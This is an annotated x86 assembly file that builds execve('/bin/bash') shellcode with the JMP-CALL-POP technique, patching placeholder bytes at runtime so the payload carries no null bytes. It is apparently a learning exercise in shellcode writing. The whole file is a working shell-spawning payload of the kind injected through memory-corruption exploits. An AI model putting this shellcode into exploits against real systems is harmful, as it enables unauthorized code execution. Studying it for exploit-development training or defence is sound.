; Date: 27/01/2019
; Execve_Bash.asm
; Author: Daniele Votta
; Description: This program invoke excve.
; JMP | CALL | POP | Techniques
;
; SYNOPSIS
;      #include <unistd.h>
;      int execve(const char *filename, char *const argv[], char *const envp[]);
;
; filename -> /bin/bash, 0x0 -> EBX
; argv[] -> Address of /bin/bash, 0x00000000 -> ECX
; envp[] -> 0x00000000 -> EDX
; Structure like this -> /bin/bash|A|BBBB|CCCC
;

; section wtext exec write | to make the .text section writable | Otherwise pass -N to the linker

global _start

section .text

_start:
	jmp short call_shellcode

shellcode:
	pop esi			; contains the address of message
	xor ebx,ebx		; 0s
	mov byte[esi+9],bl	; Convert "A" to 0x0 -> the 9 byte in message -> "/bin/bashABBBBCCCC" -> A become 0
	mov dword[esi+10],esi   ; store the address of esi -> /bin/bash0x0
	mov dword [esi+14],ebx  ; Convert "BBBB" to 0x00000000
        
	; Call Execve
	lea ebx,[esi]		
	lea ecx,[esi+10]
	lea edx,[esi+14]
	xor eax,eax
	mov al,11		; execve FC 11
        int 0x80                ; syscall

call_shellcode:
	call shellcode
	message db "/bin/bashABBBBCCCC"
